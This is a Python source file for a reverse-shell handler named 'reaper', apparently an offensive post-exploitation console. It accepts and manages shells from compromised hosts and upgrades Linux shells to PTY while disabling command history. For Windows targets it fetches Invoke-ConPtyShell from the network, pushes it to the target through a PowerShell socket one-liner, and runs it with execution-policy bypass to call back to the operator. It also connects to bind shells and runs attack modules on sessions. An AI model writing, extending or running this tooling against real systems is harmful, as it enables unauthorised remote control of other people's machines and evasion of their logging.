from __future__ import annotations

import os
import queue
import readline
import select
import shutil
import signal
import socket
import sys
import threading
import time
import urllib.request
from pathlib import Path
from typing import Dict, List, Optional

from reaper.cli import print_help
from reaper.modules.loader import get_module, load_modules
from reaper.server import FileServer
from reaper.session import RawTerminal, Session
from reaper.utils.payloads import PayloadGenerator
from reaper.utils.tcp import spawn_send_server
from reaper.utils.ui import (
    ASH, BONE, CRIMSON, SCARLET, VOID,
    _b, _c, _gh, _gr, _p, _r, _v, _y,
    breaker, breaker_with_text, colored_text, display_art,
    gradient_text, notify, print_report_box, Spinner, yesno,
    print_payloads,
)

LOCALUSER = os.getenv("USER") or os.getenv("USERNAME") or "user"


def _platform_badge(platform) -> str:
    _NAMES  = {"linux": "Linux", "windows_cmd": "cmd", "windows_ps": "PowerShell", "any": "any"}
    _COLORS = {"linux": _y, "windows_cmd": colored_text, "windows_ps": colored_text, "any": _gr}

    def _tag(p: str) -> str:
        if p in ("windows_cmd", "windows_ps"):
            return colored_text(_NAMES.get(p, p), (100, 180, 230))
        return _COLORS.get(p, _gr)(_NAMES.get(p, p))

    ob, cb = _gr("["), _gr("]")
    if isinstance(platform, list):
        inner = _gr(", ").join(_tag(p) for p in platform)
        return f"{ob}{inner}{cb}"
    return f"{ob}{_tag(platform)}{cb}"


class Listener:
    CTRL_Z = b"\x1a"
    CTRL_C = b"\x03"

    _CONPTYSHELL_URL = (
        "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
        "/refs/heads/master/Invoke-ConPtyShell.ps1"
    )

    def __init__(
        self,
        host: str = "0.0.0.0",
        ports: List[int] | None = None,
        log_sessions: bool = True,
        log_dir: Path | None = None,
    ):
        self.host         = host
        self.ports        = ports or [4444]
        self.log_sessions = log_sessions
        self.log_dir      = log_dir or (Path.home() / ".reaper" / "logs")

        self._sessions: Dict[int, Session] = {}
        self._next_id    = 1
        self._id_lock    = threading.Lock()
        self._running    = False
        self._server_socks: Dict[int, socket.socket] = {}  # port → socket
        self._notify_r, self._notify_w = os.pipe()
        self._in_session = False
        self._pending_notifications: list = []
        self._notif_lock   = threading.Lock()
        self._pending_conpty: dict = {}
        self._file_server: Optional[FileServer] = None
        self._screenable   = False

    # ------------------------------------------------------------------ #
    # Session management
    # ------------------------------------------------------------------ #

    def _add(self, conn: socket.socket, addr: tuple) -> Session:
        with self._id_lock:
            sid = self._next_id
            self._next_id += 1
        sess = Session(id=sid, conn=conn, addr=addr)
        if self.log_sessions:
            sess.open_log(self.log_dir)
        self._sessions[sid] = sess
        return sess

    def _get(self, sid: int) -> Optional[Session]:
        return self._sessions.get(sid)

    def _remove(self, sid: int) -> None:
        sess = self._sessions.pop(sid, None)
        if sess:
            sess.close()

    def _prune(self) -> None:
        for sid in [k for k, s in list(self._sessions.items()) if not s.alive]:
            self._sessions.pop(sid)

    def _mask_ip(self, ip: str) -> str:
        return "<REDACTED>" if self._screenable else ip

    # ------------------------------------------------------------------ #
    # Accept loops
    # ------------------------------------------------------------------ #

    def _accept_loop(self, srv_sock: socket.socket) -> None:
        while self._running:
            try:
                srv_sock.settimeout(1.0)
                conn, addr = srv_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            sess = self._add(conn, addr)
            threading.Thread(
                target=self._detect_and_notify,
                args=(sess,),
                daemon=True,
                name=f"detect-{sess.id}",
            ).start()

    def _detect_and_notify(self, sess: Session) -> None:
        from reaper.detect import detect_os

        parent_os = self._pending_conpty.pop(sess.addr[0], None)
        if parent_os is not None:
            sess.os_type = parent_os
        else:
            # First detection attempt
            detect_os(sess)
            # If detection failed, wait a moment and retry once
            if sess.alive and sess.os_type is None:
                time.sleep(0.5)
                detect_os(sess)

        if not sess.alive:
            return

        # Build the new-session notification line
        os_tag    = f" {_gr('[')} {sess.os_label()} {_gr(']')}" if sess.os_type else f" {_gr('[?]')}"
        masked_ip = self._mask_ip(sess.addr[0])
        msg       = f"{_b(_p(f'#{sess.id}'))}  {_c(masked_ip)}{_gr(f':{sess.addr[1]}')}{os_tag}"

        # ── Auto-upgrade (Linux only, before notifying so the shell is ready) ──
        if sess.os_type == "linux" and not sess.upgraded:
            self._auto_upgrade(sess)

        os.write(self._notify_w, b"1\n")

        def _emit(kind: str, text: str) -> None:
            sys.stdout.write(f"\r\033[K")
            notify(kind, text)
            sys.stdout.write(self._prompt())
            sys.stdout.flush()

        notifications = [("new", msg)]

        if sess.os_type is None:
            notifications.append((
                "warning",
                f"OS detection failed on {_p(f'#{sess.id}')} — "
                f"shell may be unstable. Try {_b('upgrade ' + str(sess.id))} or reconnect.",
            ))
        elif sess.os_type == "linux":
            if sess.upgraded:
                notifications.append(("success", f"Shell {_p(f'#{sess.id}')} auto-upgraded to PTY."))
            else:
                notifications.append((
                    "warning",
                    f"Auto-upgrade failed on {_p(f'#{sess.id}')} — run {_b('upgrade ' + str(sess.id))} manually.",
                ))

        if self._in_session:
            with self._notif_lock:
                self._pending_notifications.extend(notifications)
        else:
            for kind, text in notifications:
                _emit(kind, text)

        threading.Thread(
            target=self._watch_session, args=(sess,),
            daemon=True, name=f"watch-{sess.id}",
        ).start()

    def _watch_session(self, sess: Session) -> None:
        """Background thread: detect when an idle session disconnects."""
        while self._running and sess.alive:
            try:
                r, _, _ = select.select([sess.conn], [], [], 1.0)
                if r:
                    data = sess.conn.recv(1)
                    if not data:
                        sess.alive = False
                        return
            except OSError:
                sess.alive = False
                return

    def _auto_upgrade(self, sess: Session) -> None:
        """Run PTY upgrade silently in the background thread."""
        try:
            spawn = (
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                "script -qc /bin/bash /dev/null\n"
            )
            sess.send(spawn.encode())
            self._drain(sess, 1.0)
            if not sess.alive:
                return
            sess.send(b"export TERM=xterm-256color HISTFILE=/dev/null\n")
            self._drain(sess, 0.4)
            self._sync_winsize(sess)
            self._drain(sess, 0.3)
            sess.upgraded = True
        except Exception:
            pass

    # ------------------------------------------------------------------ #
    # Start / stop
    # ------------------------------------------------------------------ #

    def _open_port(self, port: int) -> bool:
        """Bind a new port and start its accept thread. Returns True on success."""
        if port in self._server_socks:
            notify("warning", f"Already listening on port {_p(str(port))}.")
            return False
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((self.host, port))
            srv.listen(16)
        except OSError as exc:
            notify("error", f"Cannot bind port {_p(str(port))}: {exc}")
            return False
        self._server_socks[port] = srv
        if port not in self.ports:
            self.ports.append(port)
        threading.Thread(
            target=self._accept_loop, args=(srv,), daemon=True, name=f"accept-{port}"
        ).start()
        return True

    def _close_port(self, port: int) -> bool:
        """Stop accepting on *port*. Returns True on success."""
        srv = self._server_socks.pop(port, None)
        if srv is None:
            notify("error", f"Not listening on port {_p(str(port))}.")
            return False
        try:
            srv.close()
        except OSError:
            pass
        if port in self.ports:
            self.ports.remove(port)
        return True

    def start(self) -> None:
        self._running = True
        for port in self.ports[:]:
            self._open_port(port)

        display_art()

        ports_str = "  ".join(_b(str(p)) for p in self.ports)
        notify("info", f"Listening on {_b(self.host)} : {ports_str}")
        if self.log_sessions:
            notify("info", f"Session logs → {_gr(str(self.log_dir))}")
        print()

        self._setup_readline()
        self._main_loop()

    def _setup_readline(self) -> None:
        """Context-aware tab completion and persistent history for the main prompt."""
        _HISTFILE = Path.home() / ".reaper" / "history"
        _HISTFILE.parent.mkdir(parents=True, exist_ok=True)
        try:
            readline.read_history_file(str(_HISTFILE))
        except FileNotFoundError:
            pass
        readline.set_history_length(1000)
        import atexit
        atexit.register(readline.write_history_file, str(_HISTFILE))

        _COMMANDS = [
            "ls", "list", "go", "interact", "upgrade", "kill", "payload",
            "payloads", "modules", "run", "reload", "serve", "stopserve",
            "listeners", "addport", "rmport", "log", "clear", "help", "exit", "quit",
        ]

        # Commands that take a session id as first arg
        _SESSION_CMDS = {"go", "g", "interact", "i", "upgrade", "u", "kill", "log"}
        # Commands where second arg is a session id (after module name)
        _MODULE_THEN_SESSION = {"run"}

        def _session_ids() -> list[str]:
            return [str(sid) for sid, s in self._sessions.items() if s.alive]

        def _module_names() -> list[str]:
            from reaper.modules.loader import load_modules
            return list(load_modules().keys())

        def _active_ports() -> list[str]:
            return [str(p) for p in self._server_socks]

        def _iface_names() -> list[str]:
            from reaper.utils.payloads import _get_interfaces
            return list(_get_interfaces().keys())

        def _completer(text: str, state: int) -> str | None:
            buf   = readline.get_line_buffer()
            parts = buf.lstrip().split()

            # Still typing the first word
            if len(parts) == 0 or (len(parts) == 1 and not buf.endswith(" ")):
                options = [c for c in _COMMANDS if c.startswith(text)]

            # First word done — figure out context
            else:
                cmd      = parts[0].lower()
                n_args   = len(parts) - 1  # args already typed (excl. current text)
                if buf.endswith(" "):
                    n_args += 1            # cursor is on a new blank arg

                if cmd in _SESSION_CMDS:
                    options = [s for s in _session_ids() if s.startswith(text)]

                elif cmd in _MODULE_THEN_SESSION:
                    if n_args == 1:
                        # second token: module name
                        options = [m for m in _module_names() if m.startswith(text)]
                    elif n_args >= 2:
                        # third token: session id
                        options = [s for s in _session_ids() if s.startswith(text)]
                    else:
                        options = []

                elif cmd in ("payload", "payloads", "p"):
                    options = [i for i in _iface_names() if i.startswith(text)]

                elif cmd == "rmport":
                    options = [p for p in _active_ports() if p.startswith(text)]

                else:
                    options = []

            return options[state] if state < len(options) else None

        readline.set_completer(_completer)
        readline.set_completer_delims(" \t")
        readline.parse_and_bind("tab: complete")

    def stop(self) -> None:
        self._running = False
        for srv in list(self._server_socks.values()):
            try:
                srv.close()
            except OSError:
                pass
        self._server_socks.clear()

        if self._file_server and self._file_server.running:
            self._file_server.stop()

        with Spinner("Closing sessions…"):
            for s in list(self._sessions.values()):
                if s.upgraded:
                    try:
                        s.send(b"exit\n")
                        time.sleep(0.3)
                    except Exception:
                        pass
                s.close()
        print()

    # ------------------------------------------------------------------ #
    # Prompt
    # ------------------------------------------------------------------ #

    @staticmethod
    def _rl_wrap(s: str) -> str:
        """Wrap every ANSI escape in readline ignore markers so cursor math is correct."""
        import re
        return re.sub(r"(\033\[[^m]*m)", r"\001\1\002", s)

    def _prompt(self) -> str:
        alive = sum(1 for s in self._sessions.values() if s.alive)
        noun  = "session" if alive == 1 else "sessions"
        count = colored_text(str(alive), SCARLET if alive else ASH)
        anon  = colored_text(" [ANON]", ASH) if self._screenable else ""
        raw = (
            f"{LOCALUSER}"
            + colored_text("@", SCARLET)
            + colored_text("reaper", BONE)
            + anon
            + _gr("(")
            + count
            + _gr(f" {noun})")
            + gradient_text(" ❯ ", CRIMSON, BONE)
        )
        return self._rl_wrap(raw)

    # ------------------------------------------------------------------ #
    # Main loop
    # ------------------------------------------------------------------ #

    def _main_loop(self) -> None:
        while self._running:
            try:
                r, _, _ = select.select([self._notify_r], [], [], 0)
                if r:
                    os.read(self._notify_r, 4096)
                raw = input(self._prompt()).strip()
            except EOFError:
                break
            except KeyboardInterrupt:
                print()
                continue

            if not raw:
                continue

            # Hidden screenable toggle
            if raw == "_reaper_screenable_":
                try:
                    readline.remove_history_item(readline.get_current_history_length() - 1)
                except Exception:
                    pass
                self._screenable = not self._screenable
                state = _b("ON") if self._screenable else _gr("OFF")
                sys.stdout.write(f"\r\033[K")
                notify("info", f"Screenable mode {state}")
                sys.stdout.write(self._prompt())
                sys.stdout.flush()
                continue

            parts = raw.split()
            cmd   = parts[0].lower()

            if cmd in ("exit", "quit"):
                self.stop()
                return

            elif cmd in ("clear", "cls"):
                sys.stdout.write("\033[2J\033[H")
                sys.stdout.flush()

            elif cmd in ("help", "h", "?"):
                print_help()

            elif cmd in ("ls", "l", "list"):
                self._cmd_ls()

            elif cmd in ("go", "g", "interact", "i"):
                self._require_id(parts, self._cmd_go)

            elif cmd in ("upgrade", "u"):
                self._require_id(parts, self._cmd_upgrade)

            elif cmd == "kill":
                self._require_id(parts, self._cmd_kill)

            elif cmd in ("payload", "payloads", "p"):
                if len(parts) < 2:
                    from reaper.utils.payloads import _get_interfaces
                    ifaces = list(_get_interfaces().keys())
                    notify("error", f"Usage: payloads {_p('<iface>')}")
                    notify("status", _gr(f"Available: {', '.join(ifaces) or 'none'}"))
                else:
                    self._cmd_payload(parts[1])

            elif cmd in ("modules", "mods", "mdls"):
                self._cmd_modules()

            elif cmd in ("reload", "rl"):
                self._cmd_reload()

            elif cmd == "run":
                self._dispatch_run(parts)

            elif cmd == "log":
                self._require_id(parts, self._cmd_log)

            elif cmd == "serve":
                self._cmd_serve(parts[1] if len(parts) > 1 else ".",
                                int(parts[2]) if len(parts) > 2 else 8000)

            elif cmd == "stopserve":
                self._cmd_stopserve()

            elif cmd == "listeners":
                self._cmd_listeners()

            elif cmd == "addport":
                if len(parts) < 2:
                    notify("error", f"Usage: addport {_p('<port>')}")
                else:
                    try:
                        self._cmd_addport(int(parts[1]))
                    except ValueError:
                        notify("error", "Port must be an integer.")

            elif cmd == "rmport":
                if len(parts) < 2:
                    notify("error", f"Usage: rmport {_p('<port>')}")
                else:
                    try:
                        self._cmd_rmport(int(parts[1]))
                    except ValueError:
                        notify("error", "Port must be an integer.")

            else:
                notify("error", f"Unknown command: {_p(cmd)}  — type {_b('help')}")

    def _require_id(self, parts: list, handler) -> None:
        if len(parts) < 2:
            notify("error", f"Usage: {parts[0]} {_p('<id>')}")
            return
        try:
            handler(int(parts[1]))
        except ValueError:
            notify("error", "Session id must be an integer.")

    # ------------------------------------------------------------------ #
    # Commands
    # ------------------------------------------------------------------ #

    def _cmd_ls(self) -> None:
        self._prune()
        if not self._sessions:
            print()
            notify("status", _gr("No active sessions."))
            print()
            return
        data = {}
        for s in sorted(self._sessions.values(), key=lambda x: x.id):
            masked = self._mask_ip(s.addr[0])
            key    = f"#{s.id}  {s.status_dot()}  {_c(masked)}{_gr(f':{s.addr[1]}')} [{s.os_label()}]"
            data[key] = s._uptime()
        print_report_box("Sessions", data)

    def _cmd_go(self, sid: int) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify("error", f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify("error", f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return

        ip, port   = sess.addr
        is_win_pty = sess.os_type in ("windows_cmd", "windows_ps") and sess.upgraded

        print()
        notify("info", f"Entering session {_b(_p(f'#{sid}'))} {_c(self._mask_ip(ip))}{_gr(f':{port}')}")
        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
            notify("status", _gr("Ctrl+Z to background  ·  line-by-line mode"))
        else:
            notify("status", _gr("Ctrl+Z to background  ·  Ctrl+C sends SIGINT to remote"))
        print()

        if sess.upgraded and not is_win_pty:
            self._sync_winsize(sess)
            self._drain(sess, 0.3)
            sess.send(b"\n")
            time.sleep(0.15)
            signal.signal(signal.SIGWINCH, lambda *_: self._winch(sess))

        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
            sess.send(b"\r\n")
            time.sleep(0.2)

        breaker()
        if is_win_pty:
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()

        self._in_session = True
        reason           = self._interact(sess)
        self._in_session = False

        signal.signal(signal.SIGWINCH, signal.SIG_DFL)
        print()
        breaker()

        if reason == "backgrounded":
            print()
            notify("warning", f"Session {_b(_p(f'#{sid}'))} backgrounded.")
            print()
        elif reason == "disconnected":
            print()
            notify("error", f"Session {_b(_p(f'#{sid}'))} disconnected.")
            print()
            self._remove(sid)

        self._flush_pending_notifications()

    def _cmd_upgrade(self, sid: int) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify("error", f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify("error", f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return
        if sess.upgraded:
            notify("warning", f"Session {_p(f'#{sid}')} is already upgraded.")
            if not yesno("Upgrade again?"):
                return

        if sess.os_type in ("windows_cmd", "windows_ps"):
            self._upgrade_windows_conptyshell(sess)
            return

        with Spinner("Upgrading shell to PTY…"):
            spawn = (
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                "script -qc /bin/bash /dev/null\n"
            )
            sess.send(spawn.encode())
            self._drain(sess, 0.8)
            if not sess.alive:
                notify("error", f"Session {_p(f'#{sid}')} died during upgrade.")
                return
            sess.send(b"export TERM=xterm-256color HISTFILE=/dev/null\n")
            self._drain(sess, 0.3)
            self._sync_winsize(sess)
            self._drain(sess, 0.3)
            sess.upgraded = True

        notify("success", f"Shell {_p(f'#{sid}')} upgraded to PTY.")

    def _upgrade_windows_conptyshell(self, sess: Session) -> None:
        try:
            cols, rows = shutil.get_terminal_size()
        except Exception:
            cols, rows = 80, 24

        local_ip = sess.conn.getsockname()[0]
        if local_ip in ("0.0.0.0", ""):
            local_ip = "127.0.0.1"

        with Spinner("Fetching ConPtyShell…"):
            try:
                with urllib.request.urlopen(self._CONPTYSHELL_URL, timeout=15) as resp:
                    ps1_data = resp.read()
            except Exception as exc:
                notify("error", f"Failed to fetch ConPtyShell: {exc}")
                return

        remote_path  = r"C:\Windows\Temp\Invoke-ConPtyShell.ps1"
        upload_port, upload_thread, upload_errors = spawn_send_server(ps1_data, timeout=15)
        upload_cmd = (
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{upload_port});"
            f"$_s=$_c.GetStream();"
            f"$_f=[IO.File]::OpenWrite('{remote_path}');"
            f"$_b=New-Object byte[] 65536;"
            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
            f"$_f.Close();$_c.Close()"
        )

        with Spinner(f"Uploading ConPtyShell ({len(ps1_data)} bytes)…"):
            sess.send((upload_cmd + "\r\n").encode(sess.encoding, errors="replace"))
            upload_thread.join(timeout=15)

        if upload_errors:
            notify("error", f"Upload failed: {upload_errors[0]}")
            return

        notify("info", f"ConPtyShell uploaded → {remote_path}")
        time.sleep(1.0)

        invoke_cmd = (
            f"powershell -nop -ep bypass -c \". '{remote_path}';"
            f"Invoke-ConPtyShell -RemoteIp {local_ip} -RemotePort {self.ports[0]}"
            f" -Rows {rows} -Cols {cols} -CommandLine powershell\""
        )
        notify("info", f"Invoking ConPtyShell → callback {_b(local_ip)}:{_b(str(self.ports[0]))}")

        self._pending_conpty[sess.addr[0]] = sess.os_type
        known_ids = set(self._sessions.keys())
        sess.send((invoke_cmd + "\r\n").encode(sess.encoding, errors="replace"))

        with Spinner("Waiting for ConPtyShell callback…"):
            new_sess = self._wait_for_new_session(sess.addr[0], known_ids, timeout=30.0)

        if new_sess is None:
            notify("error", "ConPtyShell did not connect back in time.")
            return

        deadline = time.monotonic() + 5.0
        while new_sess.os_type is None and time.monotonic() < deadline:
            time.sleep(0.1)

        new_sess.upgraded = True
        time.sleep(0.3)
        new_sess.conn.sendall(b"\r\n")
        notify("success", f"ConPtyShell ready as session {_p(f'#{new_sess.id}')}.")

    def _wait_for_new_session(
        self, expected_ip: str, known_ids: set, timeout: float = 30.0
    ) -> Optional[Session]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            time.sleep(0.2)
            for sid, s in list(self._sessions.items()):
                if sid not in known_ids and s.addr[0] == expected_ip:
                    return s
        return None

    def _cmd_kill(self, sid: int) -> None:
        sess = self._get(sid)
        if sess is None:
            notify("error", f"Session {_p(f'#{sid}')} not found.")
            return
        with Spinner(f"Terminating session #{sid}…"):
            if sess.upgraded:
                sess.send(b"exit\n")
                time.sleep(0.5)
            self._remove(sid)
        notify("success", f"Session {_p(f'#{sid}')} terminated.")

    def _cmd_log(self, sid: int) -> None:
        sess = self._get(sid)
        if sess is None:
            notify("error", f"Session {_p(f'#{sid}')} not found.")
            return
        if sess._log_fh:
            try:
                log_path = sess._log_fh.name
                notify("info", f"Session {_p(f'#{sid}')} log: {_c(log_path)}")
            except Exception:
                notify("status", _gr("Log path unavailable."))
        else:
            notify("status", _gr("Session logging is disabled for this session."))

    def _cmd_payload(self, iface: Optional[str] = None) -> None:
        print_payloads(iface, self.ports[0])

    def _cmd_modules(self) -> None:
        modules = load_modules()
        if not modules:
            notify("status", _gr("No modules found."))
            return
        has_cats = any(cls.category for cls in modules.values())
        if has_cats:
            grouped: dict = {}
            for name, cls in modules.items():
                cat = cls.category or "Other"
                grouped.setdefault(cat, {})[_p(name)] = (
                    f"{cls.description}  {_platform_badge(cls.platform)}"
                )
            print_report_box("Modules", grouped)
        else:
            data = {
                _p(name): f"{cls.description}  {_platform_badge(cls.platform)}"
                for name, cls in modules.items()
            }
            print_report_box("Modules", data)

    def _cmd_reload(self) -> None:
        with Spinner("Reloading modules…"):
            modules = load_modules(reload=True)
        notify("info", f"Loaded {_p(str(len(modules)))} modules.")

    def _dispatch_run(self, parts: list) -> None:
        if len(parts) < 3:
            if len(parts) == 2:
                mod_cls = get_module(parts[1])
                if mod_cls and mod_cls.usage:
                    notify("error", f"Usage: run {_p(mod_cls.usage)}")
                else:
                    notify("error", f"Usage: run {_p('<module>')} {_p('<id>')} {_p('[args…]')}")
            else:
                notify("error", f"Usage: run {_p('<module>')} {_p('<id>')} {_p('[args…]')}")
            return

        mod_name = parts[1]
        try:
            sid = int(parts[2])
        except ValueError:
            notify("error", "Session id must be an integer.")
            return
        self._cmd_run(mod_name, sid, parts[3:])

    def _cmd_run(self, mod_name: str, sid: int, mod_args: list) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify("error", f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify("error", f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return

        mod_cls = get_module(mod_name)
        if mod_cls is None:
            available = ", ".join(load_modules().keys()) or "none"
            notify("error", f"Module {_p(mod_name)} not found. Available: {_gr(available)}")
            return

        if not mod_cls.supports(sess.os_type):
            notify("error",
                   f"Module {_p(mod_name)} {_platform_badge(mod_cls.platform)} "
                   f"not compatible with session {_p(f'#{sid}')} ({sess.os_label()}).")
            return

        notify("info", f"Running module {_p(mod_name)} on session {_p(f'#{sid}')}…")
        print()
        old_handler = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, lambda *_: (_ for _ in ()).throw(KeyboardInterrupt()))
        try:
            mod = mod_cls(session=sess, args=mod_args)
            mod.run()
        except KeyboardInterrupt:
            print()
            notify("warning", "Module interrupted.")
        except Exception as exc:
            notify("error", f"Module raised an exception: {exc}")
        finally:
            signal.signal(signal.SIGINT, old_handler)
        print()

    def _cmd_serve(self, path: str, port: int = 8000) -> None:
        if self._file_server and self._file_server.running:
            notify("warning", f"HTTP server already running on port {_p(str(self._file_server.port))}. Use {_b('stopserve')} first.")
            return
        from pathlib import Path as _P
        p = _P(path).resolve()
        if not p.exists():
            notify("error", f"Path not found: {_p(str(p))}")
            return
        try:
            self._file_server = FileServer(p, port=port)
            self._file_server.start()
            notify("success", f"HTTP server started on port {_b(str(port))}  serving {_c(str(p))}")
        except OSError as exc:
            notify("error", f"Cannot start HTTP server: {exc}")

    def _cmd_stopserve(self) -> None:
        if self._file_server and self._file_server.running:
            self._file_server.stop()
            notify("success", "HTTP server stopped.")
        else:
            notify("status", _gr("No HTTP server is running."))

    def _cmd_listeners(self) -> None:
        data = {}
        for port in sorted(self._server_socks.keys()):
            data[_gr(f"TCP  0.0.0.0:{port}")] = _y("listening")
        if self._file_server and self._file_server.running:
            data[_gr(f"HTTP 0.0.0.0:{self._file_server.port}")] = _c(str(self._file_server.serving_path))
        if not data:
            notify("status", _gr("No active listeners."))
            return
        print_report_box("Listeners", data)

    def _cmd_addport(self, port: int) -> None:
        if self._open_port(port):
            notify("success", f"Now listening on port {_p(str(port))}.")

    def _cmd_rmport(self, port: int) -> None:
        if len(self._server_socks) <= 1:
            notify("warning", f"Cannot remove the last listener. Use {_b('exit')} to quit.")
            return
        if self._close_port(port):
            notify("success", f"Stopped listening on port {_p(str(port))}.")

    # ------------------------------------------------------------------ #
    # Interaction
    # ------------------------------------------------------------------ #

    def _interact(self, sess: Session) -> str:
        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
            return self._interact_windows(sess)
        return self._interact_raw(sess)

    def _interact_raw(self, sess: Session) -> str:
        stop_event = threading.Event()
        result     = ["backgrounded"]

        def _recv():
            while not stop_event.is_set() and sess.alive:
                try:
                    r, _, _ = select.select([sess.conn], [], [], 0.1)
                    if not r:
                        continue
                    data = sess.conn.recv(4096)
                    if not data:
                        sess.alive  = False
                        result[0]   = "disconnected"
                        stop_event.set()
                        return
                    if sess._log_fh:
                        sess._log_write(data, "in")
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except OSError:
                    sess.alive = False
                    result[0]  = "disconnected"
                    stop_event.set()

        recv_thread = threading.Thread(target=_recv, daemon=True)
        with RawTerminal():
            recv_thread.start()
            try:
                while not stop_event.is_set():
                    r, _, _ = select.select([sys.stdin], [], [], 0.1)
                    if not r:
                        continue
                    key = os.read(sys.stdin.fileno(), 1024)
                    if self.CTRL_Z in key:
                        before = key[: key.index(self.CTRL_Z)]
                        if before:
                            sess.send(before)
                        result[0] = "backgrounded"
                        stop_event.set()
                        break
                    if not sess.send(key):
                        result[0] = "disconnected"
                        stop_event.set()
                        break
            except OSError:
                pass

        stop_event.set()
        recv_thread.join(timeout=1.0)
        return result[0]

    def _interact_windows(self, sess: Session) -> str:
        enc        = sess.encoding
        stop_event = threading.Event()
        result     = ["backgrounded"]

        def _recv():
            buf = b""
            while not stop_event.is_set() and sess.alive:
                try:
                    r, _, _ = select.select([sess.conn], [], [], 0.1)
                    if not r:
                        continue
                    data = sess.conn.recv(4096)
                    if not data:
                        sess.alive = False
                        result[0]  = "disconnected"
                        stop_event.set()
                        return
                    buf  += data
                    text  = buf.decode(enc, errors="replace")
                    sys.stdout.write(text)
                    sys.stdout.flush()
                    buf = b""
                except OSError:
                    sess.alive = False
                    result[0]  = "disconnected"
                    stop_event.set()

        recv_thread = threading.Thread(target=_recv, daemon=True)
        recv_thread.start()
        time.sleep(0.3)

        old_sigtstp = signal.getsignal(signal.SIGTSTP)
        signal.signal(signal.SIGTSTP, lambda *_: (result.__setitem__(0, "backgrounded"), stop_event.set()))

        input_queue: queue.Queue = queue.Queue()

        def _read_input():
            while not stop_event.is_set():
                try:
                    r, _, _ = select.select([sys.stdin], [], [], 0.1)
                    if r:
                        line = sys.stdin.readline()
                        input_queue.put(line.rstrip("\n") if line else None)
                        if not line:
                            return
                except Exception:
                    return

        input_thread = threading.Thread(target=_read_input, daemon=True)
        input_thread.start()

        try:
            while not stop_event.is_set() and sess.alive:
                try:
                    cmd = input_queue.get(timeout=0.1)
                except queue.Empty:
                    continue
                if cmd is None:
                    break
                if cmd.strip().lower() in ("exit", "quit"):
                    sess.send(b"exit\r\n")
                    time.sleep(0.2)
                    result[0] = "backgrounded"
                    break
                line = (cmd + "\r\n").encode(enc, errors="replace")
                if not sess.send(line):
                    result[0] = "disconnected"
                    break
                time.sleep(0.5)
        except Exception:
            pass
        finally:
            signal.signal(signal.SIGTSTP, old_sigtstp)

        stop_event.set()
        recv_thread.join(timeout=1.0)
        return result[0]

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _flush_pending_notifications(self) -> None:
        with self._notif_lock:
            pending = self._pending_notifications[:]
            self._pending_notifications.clear()
        for kind, text in pending:
            notify(kind, text)

    def _drain(self, sess: Session, duration: float = 0.5) -> None:
        deadline = time.monotonic() + duration
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            try:
                r, _, _ = select.select([sess.conn], [], [], min(remaining, 0.05))
                if r:
                    sess.conn.recv(4096)
            except OSError:
                break

    def _sync_winsize(self, sess: Session) -> None:
        try:
            cols, rows = shutil.get_terminal_size()
        except Exception:
            return
        sess.send(f"stty rows {rows} cols {cols} 2>/dev/null\n".encode())

    def _winch(self, sess: Session) -> None:
        if sess.os_type in ("windows_cmd", "windows_ps"):
            return
        self._sync_winsize(sess)
        self._drain(sess, 0.15)


# ------------------------------------------------------------------ #
# Bind-shell connector
# ------------------------------------------------------------------ #

class BindConnector:
    """Connect to a bind shell (target listens, we connect)."""

    def __init__(self, host: str, port: int, listener: Listener):
        self.host     = host
        self.port     = port
        self.listener = listener

    def connect(self) -> None:
        notify("info", f"Connecting to bind shell {_b(self.host)}:{_b(str(self.port))}…")
        try:
            conn = socket.create_connection((self.host, self.port), timeout=10)
        except Exception as exc:
            notify("error", f"Connection failed: {exc}")
            return
        addr = (self.host, self.port)
        sess = self.listener._add(conn, addr)
        threading.Thread(
            target=self.listener._detect_and_notify,
            args=(sess,),
            daemon=True,
        ).start()
        notify("success", f"Bind shell connected as session {_p(f'#{sess.id}')}.")
